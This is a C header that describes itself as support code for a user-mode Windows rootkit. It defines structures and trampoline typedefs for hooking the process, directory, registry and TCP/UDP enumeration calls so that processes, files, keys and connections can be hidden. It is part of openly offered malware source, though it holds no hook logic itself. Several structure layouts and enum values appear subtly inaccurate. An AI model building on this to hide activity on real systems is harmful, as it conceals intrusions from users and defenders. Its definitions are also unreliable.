/*
 * rknt.h - ntdll / win32 API definitions used by the rootkit
 *
 * Everything the hooks need that is missing from the public headers:
 * SYSTEM_PROCESS_INFORMATION trees, directory-enumeration structures,
 * registry-enumeration structures, and the winsock API-table types.
 */
#ifndef RK_NT_H
#define RK_NT_H

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>

/* ================================================================== */
/* STATUS codes we need that winternl may not define                  */
/* ================================================================== */

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif
#ifndef STATUS_NO_MORE_FILES
#define STATUS_NO_MORE_FILES        ((NTSTATUS)0x80000006L)
#endif
#ifndef STATUS_NO_MORE_ENTRIES
#define STATUS_NO_MORE_ENTRIES      ((NTSTATUS)0x8000001AL)
#endif
#ifndef STATUS_INVALID_PARAMETER_1
#define STATUS_INVALID_PARAMETER_1  ((NTSTATUS)0xC0000070L)
#endif
#ifndef STATUS_INVALID_PARAMETER_2
#define STATUS_INVALID_PARAMETER_2  ((NTSTATUS)0xC0000071L)
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL     ((NTSTATUS)0xC0000023L)
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(s)               (((NTSTATUS)(s)) >= 0)
#endif

#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

/* ================================================================== */
/* SYSTEM_PROCESS_INFORMATION (SystemProcessInformation = 5)          */
/* ================================================================== */

/*
 * The canonical x64 layout returned by SystemProcessInformation (5):
 *
 *   ULONG NextEntryOffset;
 *   ULONG NumberOfThreads;
 *   LARGE_INTEGER WorkingSetSize;
 *   LARGE_INTEGER VirtualSize;
 *   ULONG PeakVirtualSize;
 *   LARGE_INTEGER WorkingSetPeakSize;
 *   ULONG PageFaultCount;
 *   LARGE_INTEGER QuotaPeakPagedPoolUsage;
 *   LARGE_INTEGER QuotaPagedPoolUsage;
 *   LARGE_INTEGER QuotaPeakNonPagedPoolUsage;
 *   LARGE_INTEGER QuotaNonPagedPoolUsage;
 *   LARGE_INTEGER PagefileUsage;
 *   LARGE_INTEGER PeakPagefileUsage;
 *   LARGE_INTEGER PrivatePageCount;
 *   LARGE_INTEGER ReadOperationCount;
 *   LARGE_INTEGER WriteOperationCount;
 *   LARGE_INTEGER OtherOperationCount;
 *   LARGE_INTEGER ReadTransferCount;
 *   LARGE_INTEGER WriteTransferCount;
 *   LARGE_INTEGER OtherTransferCount;
 *   LARGE_INTEGER ThreadInfos[]...  (dynamically sized)
 *   SYSTEM_PROCESS_INFORMATION_SUMMARY (after threads)
 *
 * Because winternl.h already declares SYSTEM_PROCESS_INFORMATION with a
 * fixed-layout Windows Vista shape (mis-declared on 64-bit), we declare
 * our own offset-based view: only the two fields we need to manipulate
 * are relevant; everything else is addressed by offset arithmetic.
 *
 *   offset 0x00  NextEntryOffset (ULONG)
 *   offset 0x04  NumberOfThreads (ULONG)
 *   ...
 *   offset 0x??  ImageName (UNICODE_STRING) - layout differs per build
 *   offset 0x??  UniqueProcessId (HANDLE)
 *
 * To stay version-independent, we locate ImageName and UniqueProcessId
 * by scanning the first 0x100 bytes for plausible field positions, which
 * is what r77 and similar user-mode rootkits do. See hide_proc.cpp.
 */
typedef struct _RK_SPI_SCAN {
    ULONG NextEntryOffset;      /* copy of the entry's own offset field */
    ULONG NumberOfThreads;
    UNICODE_STRING ImageName;   /* relocated pointer view */
    HANDLE UniqueProcessId;
} RK_SPI_SCAN;

/* ================================================================== */
/* Directory enumeration structures                                   */
/* ================================================================== */

typedef struct _RK_FILE_DIRECTORY_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    WCHAR           FileName[1];
} RK_FILE_DIRECTORY_INFORMATION;

typedef struct _RK_FILE_FULL_DIR_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    WCHAR           FileName[1];
} RK_FILE_FULL_DIR_INFORMATION;

typedef struct _RK_FILE_ID_FULL_DIR_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    LARGE_INTEGER   FileId;
    WCHAR           FileName[1];
} RK_FILE_ID_FULL_DIR_INFORMATION;

typedef struct _RK_FILE_BOTH_DIR_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    CCHAR           ShortNameLength;
    WCHAR           ShortName[12];
    WCHAR           FileName[1];
} RK_FILE_BOTH_DIR_INFORMATION;

typedef struct _RK_FILE_ID_BOTH_DIR_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    CCHAR           ShortNameLength;
    WCHAR           ShortName[12];
    LARGE_INTEGER   FileId;
    WCHAR           FileName[1];
} RK_FILE_ID_BOTH_DIR_INFORMATION;

typedef struct _RK_FILE_NAMES_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    ULONG           FileNameLength;
    WCHAR           FileName[1];
} RK_FILE_NAMES_INFORMATION;

/* FILE_INFORMATION_CLASS values used by NtQueryDirectoryFile */
typedef enum _RK_FILE_INFO_CLASS {
    RK_FileDirectoryInformation        = 1,
    RK_FileFullDirectoryInformation    = 2,
    RK_FileBothDirectoryInformation    = 3,
    RK_FileNamesInformation            = 12,
    RK_FileIdFullDirectoryInformation  = 16,
    RK_FileIdBothDirectoryInformation  = 17,
} RK_FILE_INFO_CLASS;

/* ================================================================== */
/* Registry enumeration structures                                    */
/* ================================================================== */

typedef struct _RK_KEY_BASIC_INFORMATION {
    LARGE_INTEGER   LastWriteTime;
    ULONG           TitleIndex;
    ULONG           NameLength;
    WCHAR           Name[1];
} RK_KEY_BASIC_INFORMATION;

typedef struct _RK_KEY_NODE_INFORMATION {
    LARGE_INTEGER   LastWriteTime;
    ULONG           TitleIndex;
    ULONG           ClassOffset;
    ULONG           ClassLength;
    ULONG           NameLength;
    WCHAR           Name[1];
} RK_KEY_NODE_INFORMATION;

typedef struct _RK_KEY_FULL_INFORMATION {
    LARGE_INTEGER   LastWriteTime;
    ULONG           TitleIndex;
    ULONG           ClassOffset;
    ULONG           ClassLength;
    ULONG           MaxNameLength;
    ULONG           MaxClassLength;
    ULONG           MaxValues;
    ULONG           MaxValueNameLength;
    ULONG           MaxValueDataLength;
    ULONG           NameLength;
    ULONG           ClassLength_Full;
    WCHAR           Name[1];
} RK_KEY_FULL_INFORMATION;

typedef struct _RK_KEY_VALUE_BASIC_INFORMATION {
    ULONG           TitleIndex;
    ULONG           Type;
    ULONG           NameLength;
    WCHAR           Name[1];
} RK_KEY_VALUE_BASIC_INFORMATION;

typedef struct _RK_KEY_VALUE_FULL_INFORMATION {
    ULONG           TitleIndex;
    ULONG           Type;
    ULONG           DataOffset;
    ULONG           DataLength;
    ULONG           NameLength;
    WCHAR           Name[1];
} RK_KEY_VALUE_FULL_INFORMATION;

typedef struct _RK_KEY_VALUE_PARTIAL_INFORMATION {
    ULONG           TitleIndex;
    ULONG           Type;
    ULONG           DataLength;
    UCHAR           Data[1];
} RK_KEY_VALUE_PARTIAL_INFORMATION;

typedef struct _RK_KEY_NAME_INFORMATION {
    ULONG           NameLength;
    WCHAR           Name[1];
} RK_KEY_NAME_INFORMATION;

/* KEY_INFORMATION_CLASS values used by NtEnumerateKey */
typedef enum _RK_KEY_INFO_CLASS {
    RK_KeyBasicInformation         = 0,
    RK_KeyNodeInformation          = 1,
    RK_KeyFullInformation          = 2,
    RK_KeyNameInformation          = 3,
    RK_KeyCachedInformation        = 4,
    RK_KeyFlagsInformation         = 5,
    RK_KeyVirtualizationInformation= 6,
} RK_KEY_INFO_CLASS;

/* KEY_VALUE_INFORMATION_CLASS values used by NtEnumerateValueKey */
typedef enum _RK_KEY_VALUE_INFO_CLASS {
    RK_KeyValueBasicInformation     = 0,
    RK_KeyValueFullInformation      = 1,
    RK_KeyValuePartialInformation   = 2,
    RK_KeyValuePartialInformationAlign = 3,
} RK_KEY_VALUE_INFO_CLASS;

/* ================================================================== */
/* Native API pointer typedefs (hook trampolines)                     */
/* ================================================================== */

/* Information-class parameters are declared as ULONG: the wire format is
 * identical (4-byte integral) and we avoid enum redefinition conflicts
 * with winternl.h. */

typedef NTSTATUS (NTAPI *RK_pfn_NtQuerySystemInformation)(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength);

typedef NTSTATUS (NTAPI *RK_pfn_NtQueryDirectoryFile)(
    HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
    ULONG FileInformationClass, BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName, BOOLEAN RestartScan);

typedef NTSTATUS (NTAPI *RK_pfn_NtQueryDirectoryFileEx)(
    HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
    ULONG FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName);

typedef NTSTATUS (NTAPI *RK_pfn_NtEnumerateKey)(
    HANDLE KeyHandle, ULONG Index, ULONG KeyInformationClass,
    PVOID KeyInformation, ULONG Length, PULONG ResultLength);

typedef NTSTATUS (NTAPI *RK_pfn_NtEnumerateValueKey)(
    HANDLE KeyHandle, ULONG Index, ULONG KeyValueInformationClass,
    PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);

/* ================================================================== */
/* Winsock helper API tables (iphlpapi)                               */
/* ================================================================== */

/* ANY_SIZE normally comes from ws2ipdef.h; winsock headers are not
 * included here to avoid Windows.h ordering conflicts. */
#ifndef ANY_SIZE
#define ANY_SIZE 1
#endif

/* IN6_ADDR equivalent (in6addr.h not included). */
typedef struct _RK_IN6_ADDR {
    UCHAR Byte[16];
} RK_IN6_ADDR;

typedef struct _RK_MIB_TCPROW {
    DWORD dwState;
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwRemoteAddr;
    DWORD dwRemotePort;
} RK_MIB_TCPROW;

typedef struct _RK_MIB_TCPTABLE {
    DWORD         dwNumEntries;
    RK_MIB_TCPROW table[ANY_SIZE];
} RK_MIB_TCPTABLE;

typedef struct _RK_MIB_TCPROW_OWNER_PID {
    DWORD dwState;
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwRemoteAddr;
    DWORD dwRemotePort;
    DWORD dwOwningPid;
} RK_MIB_TCPROW_OWNER_PID;

typedef struct _RK_MIB_TCPTABLE_OWNER_PID {
    DWORD dwNumEntries;
    RK_MIB_TCPROW_OWNER_PID table[ANY_SIZE];
} RK_MIB_TCPTABLE_OWNER_PID;

typedef struct _RK_MIB_TCPROW_OWNER_MODULE {
    DWORD dwState;
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwRemoteAddr;
    DWORD dwRemotePort;
    DWORD dwOwningPid;
    LARGE_INTEGER liCreateTimestamp;
    ULONGLONG     OwningModuleInfo[16];
} RK_MIB_TCPROW_OWNER_MODULE;

typedef struct _RK_MIB_TCPTABLE_OWNER_MODULE {
    DWORD dwNumEntries;
    RK_MIB_TCPROW_OWNER_MODULE table[ANY_SIZE];
} RK_MIB_TCPTABLE_OWNER_MODULE;

typedef struct _RK_MIB_UDPROW {
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
} RK_MIB_UDPROW;

typedef struct _RK_MIB_UDPTABLE {
    DWORD dwNumEntries;
    RK_MIB_UDPROW table[ANY_SIZE];
} RK_MIB_UDPTABLE;

typedef struct _RK_MIB_UDPROW_OWNER_PID {
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwOwningPid;
} RK_MIB_UDPROW_OWNER_PID;

typedef struct _RK_MIB_UDPTABLE_OWNER_PID {
    DWORD dwNumEntries;
    RK_MIB_UDPROW_OWNER_PID table[ANY_SIZE];
} RK_MIB_UDPTABLE_OWNER_PID;

typedef struct _RK_MIB_UDPROW_OWNER_MODULE {
    DWORD dwLocalAddr;
    DWORD dwLocalPort;
    DWORD dwOwningPid;
    LARGE_INTEGER liCreateTimestamp;
    ULONGLONG     OwningModuleInfo[16];
} RK_MIB_UDPROW_OWNER_MODULE;

typedef struct _RK_MIB_UDPTABLE_OWNER_MODULE {
    DWORD dwNumEntries;
    RK_MIB_UDPROW_OWNER_MODULE table[ANY_SIZE];
} RK_MIB_UDPTABLE_OWNER_MODULE;

typedef struct _RK_MIB_TCP6ROW {
    USHORT            State;
    RK_IN6_ADDR       LocalAddr;
    DWORD             dwLocalScopeId;
    USHORT            dwLocalPort;
    RK_IN6_ADDR       RemoteAddr;
    DWORD             dwRemoteScopeId;
    USHORT            dwRemotePort;
} RK_MIB_TCP6ROW;

typedef struct _RK_MIB_TCP6TABLE {
    DWORD dwNumEntries;
    RK_MIB_TCP6ROW table[ANY_SIZE];
} RK_MIB_TCP6TABLE;

typedef struct _RK_MIB_UDP6ROW {
    RK_IN6_ADDR       LocalAddr;
    DWORD             dwLocalScopeId;
    USHORT            dwLocalPort;
} RK_MIB_UDP6ROW;

typedef struct _RK_MIB_UDP6TABLE {
    DWORD dwNumEntries;
    RK_MIB_UDP6ROW table[ANY_SIZE];
} RK_MIB_UDP6TABLE;

#endif /* RK_NT_H */